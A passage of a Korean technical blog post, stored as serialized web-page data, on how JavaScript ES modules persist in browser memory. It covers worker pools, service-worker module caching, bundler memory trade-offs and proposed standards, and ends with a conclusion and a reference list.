punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"23\",\"children\":\"    \\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"24\",\"children\":[\"    availableWorker\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"busy\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token boolean\",\"children\":\"true\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"25\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 워커 실행 및 결과 반환\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"26\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" result \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"await\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"this\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"runWorker\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"availableWorker\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"worker\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" data\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"27\",\"children\":[\"    availableWorker\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"busy\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token boolean\",\"children\":\"false\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"28\",\"children\":\"    \\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"29\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 대기 중인 작업 처리\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"30\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"if\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"this\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"queue\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"length\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"\u003e\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"0\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"31\",\"children\":[\"      \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" data\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" resolve \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"this\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"queue\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"shift\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"32\",\"children\":[\"      \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"resolve\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"this\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"execute\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"data\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"33\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"34\",\"children\":\"    \\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"35\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"return\"}],\" result\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"36\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"37\",\"children\":\"  \\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"38\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"terminate\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"39\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 모든 워커 종료 = 모든 모듈 메모리 해제\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"40\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"this\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"workers\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"forEach\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token parameter\",\"children\":\"w\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token arrow operator\",\"children\":\"=\u003e\"}],\" w\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"worker\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"terminate\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"41\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"this\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"workers\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"[\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"]\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"42\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"43\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"44\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"45\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 사용 예\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"46\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" pool \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"ModuleWorkerPool\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'./processor-worker.js'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"4\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"47\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"await\"}],\" pool\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"execute\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"data\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"48\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 작업 완료 후\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"49\",\"children\":[\"pool\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"terminate\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"  \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 모든 워커의 모듈 메모리 해제\"}],\"\\n\"]}]]}]}]}],\"\\n\",[\"$\",\"h3\",null,{\"id\":\"서비스-워커와-모듈-캐싱\",\"children\":\"서비스 워커와 모듈 캐싱\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"서비스 워커의 ES 모듈(Chrome 91+)은 생명주기 이벤트에 걸쳐 지속됩니다. 모듈 업데이트는 \",[\"$\",\"code\",null,{\"children\":\"importScripts\"}],\" 동작과 유사한 표준 서비스 워커 업데이트 흐름을 트리거합니다. Cache API 통합은 모듈 캐싱 전략에 대한 세밀한 제어를 허용합니다:\"]}],\"\\n\",[\"$\",\"div\",null,{\"className\":\"code-block-wrapper my-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"language-javascript code-highlight\",\"data-language\":\"javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"1\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 모듈 지원이 있는 서비스 워커\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"2\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token dom variable\",\"children\":\"navigator\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token property-access\",\"children\":\"serviceWorker\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"register\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'/sw.js'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token literal-property property\",\"children\":\"type\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'module'\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"3\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"4\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// sw.js에서\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"5\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"import\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token imports\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" handleFetch \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}]]}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"from\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'./sw-handlers.js'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"6\",\"children\":[\"self\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"addEventListener\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'fetch'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" handleFetch\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}]]}]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"서비스 워커의 정적 import는 모듈 내용이 변경될 때 업데이트를 트리거하여 일관성을 보장합니다. 하지만 동적 import는 현재 사양 제한으로 인해 지원되지 않습니다.\"}],\"\\n\",[\"$\",\"h3\",null,{\"id\":\"모듈-메모리-관리의-성능-영향\",\"children\":\"모듈 메모리 관리의 성능 영향\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"모듈 그래프 크기는 메모리 오버헤드에 직접 영향을 미칩니다. 번들러 비교에서 \",[\"$\",\"strong\",null,{\"children\":\"esbuild\"}],\"는 가장 낮은 메모리 사용량으로 10-100배 빠른 빌드를 달성하는 반면, \",[\"$\",\"strong\",null,{\"children\":\"Rollup\"}],\"은 적당한 속도로 우수한 tree shaking을 제공합니다. \",[\"$\",\"strong\",null,{\"children\":\"Webpack\"}],\"은 적절한 구성으로 좋은 최적화를 제공하지만 더 높은 메모리 오버헤드를 가집니다.\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"ES6 모듈로 tree shaking하면 정적 분석을 통해 20-50% 번들 크기 감소가 가능합니다. 동적 import를 통한 코드 분할은 최적화를 위한 자연스러운 분할점을 만듭니다. Webpack의 ModuleConcatenationPlugin(스코프 호이스팅)은 모듈을 결합하여 래퍼 함수 오버헤드를 줄입니다.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"런타임 성능은 메모리 사용량과 트레이드오프됩니다. ES6 모듈은 라이브 바인딩을 통해 더 나은 메모리 효율성을 제공하지만 속성 접근에 약간의 오버헤드가 있습니다. CommonJS는 더 빠른 \",[\"$\",\"code\",null,{\"children\":\"require()\"}],\" 호출을 제공하지만 값 복사로 인한 더 높은 메모리 사용량이 있습니다. 모듈 사전 로딩은 선행 메모리 할당 비용으로 런타임 성능을 향상시킵니다.\"]}],\"\\n\",[\"$\",\"h2\",null,{\"id\":\"새로운-표준과-미래-방향\",\"children\":\"새로운 표준과 미래 방향\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"모듈 블록 제안\"}],\"(TC39 Stage 1)은 워커 시나리오에서 더 나은 메모리 관리를 약속합니다:\"]}],\"\\n\",[\"$\",\"div\",null,{\"className\":\"code-block-wrapper my-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"language-javascript code-highlight\",\"data-language\":\"javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"1\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" moduleBlock \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" module \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"2\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"export\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"worker\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"3\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 워커 코드 인라인\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"4\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"5\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"6\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"Worker\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"moduleBlock\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token literal-property property\",\"children\":\"type\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'module'\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}]]}]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"모듈 블록은 구조적으로 복제 가능하여 Blob URL 오버헤드 없이 컨텍스트 간의 효율적인 메모리 공유를 가능하게 합니다.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"WasmGC\"}],\"(Chrome 91+)는 WebAssembly 모듈이 JavaScript 가비지 컬렉션에 참여할 수 있게 하여 이중 GC 오버헤드와 메모리 단편화를 제거합니다. 이는 가비지 컬렉션 언어의 WebAssembly 포트에 대해 20-40% 메모리 감소를 제공합니다.\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"모듈 선언 제안\"}],\"은 정적 분석을 통한 더 나은 tree shaking과 번들러 복잡성 감소로 번들 친화적 구문을 제공합니다. 이러한 새로운 표준은 모듈 메모리 관리의 미래 개선을 시사하지만, 현재 제약은 장시간 실행 애플리케이션에서 여전히 도전적입니다.\"]}],\"\\n\",[\"$\",\"h2\",null,{\"id\":\"결론\",\"children\":\"결론\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"JavaScript 모듈 메모리 지속성은 버그가 아닌 근본적인 아키텍처 제약을 나타냅니다. 모듈은 import 간에 상태를 유지하는 영구적인 싱글톤 엔티티로 설계되었습니다. 이 연구는 모듈 기반 애플리케이션에서 효과적인 메모리 관리가 모듈 자체를 언로드하려는 시도보다는 모듈 내용에 대한 신중한 주의를 필요로 함을 보여줍니다.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"프로덕션 애플리케이션의 경우:\"}],\"\\n\",[\"$\",\"ul\",null,{\"children\":[\"\\n\",[\"$\",\"li\",null,{\"children\":\"모듈 리소스에 대한 명시적 생명주기 관리 구현\"}],\"\\n\",[\"$\",\"li\",null,{\"children\":\"적절한 가비지 컬렉션 자격을 위해 WeakMap/WeakSet 사용\"}],\"\\n\",[\"$\",\"li\",null,{\"children\":\"큰 데이터에 대해 JSON import보다 fetch() 선호\"}],\"\\n\",[\"$\",\"li\",null,{\"children\":\"장시간 실행 애플리케이션에서 메모리 증가 모니터링\"}],\"\\n\",[\"$\",\"li\",null,{\"children\":\"모듈이 영구히 지속된다는 이해로 설계\"}],\"\\n\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"미래는 새로운 표준을 통한 개선을 약속하지만, 현재 애플리케이션은 최적의 메모리 효율성을 달성하기 위해 기존 제약 내에서 작업해야 합니다.\"}],\"\\n\",[\"$\",\"h2\",null,{\"id\":\"참고-문헌\",\"children\":\"참고 문헌\"}],\"\\n\",[\"$\",\"ul\",null,{\"children\":[\"\\n\",[\"$\",\"li\",null,{\"children\":[\"$\",\"a\",null,{\"href\":\"https://hacks.mozilla.org/2018/03/es-modules-a-cartoon-deep-dive/\",\"children\":\"ES modules: A cartoon deep-dive – Mozilla Hacks\"}]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"$\",\"a\",null,{\"href\":\"https://v8.dev/features/modules\",\"children\":\"JavaScript modules - V8\"}]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"$\",\"a\",null,{\"href\":\"https://exploringjs.com/es6/ch_modules.html\",\"children\":\"Modules - Exploring ES6\"}]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"$\",\"a\",null,{\"href\":\"https://esdiscuss.org/topic/are-es-modules-garbage-collected-if-so-do-they-re-execute-on-next-import\",\"children\":\"Are ES Modules garbage collected? If so, do they re-execute on next import? - ESDiscuss\"}]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"$\",\"a\",null,{\"href\":\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Memory_management\",\"children\":\"Memory management - JavaScript | MDN\"}]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"$\",\"a\",null,{\"href\":\"https://firefox-source-docs.mozilla.org/js/gc.html\",\"children\":\"SpiderMonkey garbage collector - Mozilla\"}]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"$\",\"a\",null,{\"href\":\"https://deepu.tech/memory-management-in-v8/\",\"children\":\"Visualizing memory management in V8 Engine - Technorage\"}]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"$\",\"a\",null,{\"href\":\"https://dev.to/jennieji/memory-management-in-v8-garbage-collection-and-improvements-18e6\",\"children\":\"Memory Management in V8, garbage collection and improvements - DEV Community\"}]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"$\",\"a\",null,{\"href\":\"https://blog.risingstack.com/node-js-at-scale-node-js-garbage-collection/\",\"children\":\"Node.js Garbage Collection Explained - RisingStack\"}]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"$\",\"a\",null,{\"href\":\"https://webpack.js.org/concepts/hot-module-replacement/\",\"children\":\"Hot Module Replacement | webpack\"}]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"$\",\"a\",null,{\"href\":\"https://webpack.js.org/concepts/module-federation/\",\"children\":\"Module Federation | webpack\"}]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"$\",\"a\",null,{\"href\":\"https://web.dev/articles/es-modules-in-sw/\",\"children\":\"ES modules in service workers | web.dev\"}]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"$\",\"a\",null,{\"href\":\"https://web.dev/articles/module-workers\",\"children\":\"Threading the web with module workers | web.dev\"}]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"$\",\"a\",null,{\"href\":\"https://javascript.info/garbage-collection\",\"children\":\"Garbage collection - JavaScript.info\"}]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"$\",\"a\",null,{\"href\":\"https://auth0.com/blog/four-types-of-leaks-in-your-javascript-code-and-how-to-get-rid-of-them/\",\"children\":\"4 Types of Memory Leaks in JavaScript and How to Get Rid Of Them - Auth0\"}]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"$\",\"a\",null,{\"href\":\"https://stackoverflow.com/questions/71684556/how-to-unload-dynamic-imports-in-javascript\",\"children\":\"How to unload dynamic imports in javascript? - Stack Overflow\"}]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"$\",\"a\",null,{\"href\":\"https://stackoverflow.com/questions/37620697/is-nodes-require-cache-garbage-collected\",\"children\":\"Is Node's require cache garbage collected? - Stack Overflow\"}]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"$\",\"a\",null,{\"href\":\"https://webpack.js.org/guides/tree-shaking/\",\"children\":\"Tree Shaking | webpack\"}]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"$\",\"a\",null,{\"href\":\"https://developer.chrome.com/blog/wasmgc\",\"children\":\"WebAssembly Garbage Collection (WasmGC) - Chrome Developers\"}]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"$\",\"a\",null,{\"href\":\"https://github.com/tc39/proposal-module-declarations\",\"children\":\"GitHub - tc39/proposal-module-declarations\"}]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"$\",\"a\",null,{\"href\":\"https://github.com/tc39/proposal-module-expressions\",\"children\":\"GitHub - tc39/proposal-module-expressions\"}]}],\"\\n\"]}]]\n"])</script><script>self.__next_f.push([1,"12:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"meta\",\"1\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\nd:null\n"])</script><script>self.__next_f.push([1,"16:{\"metadata\":[[\"$\",\"title\",\"0\",{\"children\":\"JavaScript 모듈의 영구적인 브라우저 메모리 지속성 | Blog\"}],[\"$\",\"meta\",\"1\",{\"name\":\"description\",\"content\":\"ES6 모듈의 메모리 지속성 메커니즘과 가비지 컬렉션 동작, 실무 관리 전략을 포괄적으로 